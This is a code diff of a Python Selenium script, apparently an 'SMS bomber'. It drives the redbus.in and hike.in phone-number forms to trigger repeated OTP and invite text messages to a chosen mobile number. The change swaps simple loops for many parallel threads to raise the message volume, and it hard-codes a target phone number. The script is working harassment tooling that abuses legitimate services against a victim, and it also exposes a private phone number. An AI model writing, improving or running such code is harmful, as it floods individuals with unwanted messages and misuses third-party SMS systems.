@@ -8,57 +8,56 @@ from threading import Thread
 chrome_options = Options()
 #chrome_options.add_argument("--headless")
 
-path = os.getcwd()+r"\chromedriver.exe"
+path = '/Users/ssvighnesh/chromedriver'
 
-def redbus_blast(mobile_no, bomb_count, seconds):
+def redbus_blast(mobile_no):
 
-    driver = webdriver.Chrome(executable_path=path, chrome_options=chrome_options)
+    driver = webdriver.Chrome(path, chrome_options=chrome_options)
     driver.get("https://www.redbus.in/account?pageName=Home&noReload=noReload")
 
-    for i in range(bomb_count):
-        mobile_input = driver.find_element_by_id("mobileNoInp")
-        mobile_input.clear()
-        mobile_input.send_keys(mobile_no)
+    mobile_input = driver.find_element_by_id("mobileNoInp")
+    mobile_input.clear()
+    mobile_input.send_keys(mobile_no)
 
-        element = driver.find_element_by_class_name("otpContainer")
-        driver.execute_script("arguments[0].click();", element)
+    element = driver.find_element_by_class_name("otpContainer")
+    driver.execute_script("arguments[0].click();", element)
 
-        element = driver.find_element_by_class_name("resendOtpContainer")
-        driver.execute_script("arguments[0].click();", element)
-
-        driver.refresh()
-        time.sleep(seconds)
-        print(i+1)
-
+    element = driver.find_element_by_class_name("resendOtpContainer")
+    driver.execute_script("arguments[0].click();", element)
+    print('redbus' )
     driver.close()
 
 
-def hike_blast(mobile_no, bomb_count, seconds):
+def hike_blast(mobile_no):
 
     driver = webdriver.Chrome(executable_path=path, chrome_options=chrome_options)
     driver.get("https://hike.in/")
 
-    for i in range(bomb_count):
-        mobile_input = driver.find_element_by_id("number-input")
-        mobile_input.clear()
-        mobile_input.send_keys(mobile_no)
+    mobile_input = driver.find_element_by_id("number-input")
+    mobile_input.clear()
+    mobile_input.send_keys(mobile_no)
 
-        element = driver.find_element_by_xpath("//div[@onclick='sendSMS(this)']")
-        driver.execute_script("arguments[0].click();", element)
+    element = driver.find_element_by_xpath("//div[@onclick='sendSMS(this)']")
+    driver.execute_script("arguments[0].click();", element)
 
-        driver.refresh()
-        print(i+1)
-        time.sleep(seconds)
+    print('hike')
 
     driver.close()
 
 
-# 9940551328
 
-seconds = float(input('Enter delay: '))
-mobile_no = input('Enter mobile number: ')
+# seconds = float(input('Enter delay: '))
+seconds=1
+# mobile_no = input('Enter mobile number: ')
+mobile_no= 9884026065
+
 bomb_count = int(input('Enter number of sms blasts: '))
-t1 = Thread(target=hike_blast, args=[mobile_no, round(bomb_count/2), seconds])
-t2 = Thread(target=redbus_blast, args=[mobile_no, round(bomb_count/2), seconds])
-t1.start()
-t2.start()
+thread_list=[]
+for i in range(bomb_count):
+    t1 = Thread(target=hike_blast, args=[mobile_no])
+    t2 = Thread(target=redbus_blast, args=[mobile_no])
+    t1.start()
+    t2.start()
+    thread_list.append(t1)
+    thread_list.append(t2)
+    time.sleep(seconds)
